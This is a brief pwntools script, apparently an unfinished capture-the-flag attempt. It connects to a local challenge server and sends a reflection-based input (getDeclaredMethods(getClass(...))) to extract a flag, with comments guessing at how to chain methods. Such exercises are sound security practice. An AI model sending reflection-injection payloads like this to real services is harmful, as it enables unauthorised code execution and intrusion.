# %%
from pwn import * # pip install pwntools

# %%

# set logging level
# context.log_level = 'debug'

# connect to the server
conn = remote('localhost', 1337)

# Read the input
print(conn.recvline())


# send the payload

# length method = getDeclaredMethods(getClass('ss'))[3]
# conn.sendline(b"getDeclaredMethods(getClass(/))[5]")

# I guess one has to build the method by chaining through diverse methods...
# something like that:
conn.sendline(b"getDeclaredMethods(getClass('ss'))[3]")

# print the response 
flag = conn.recvline().decode('utf-8')
print("Flag: " + flag)
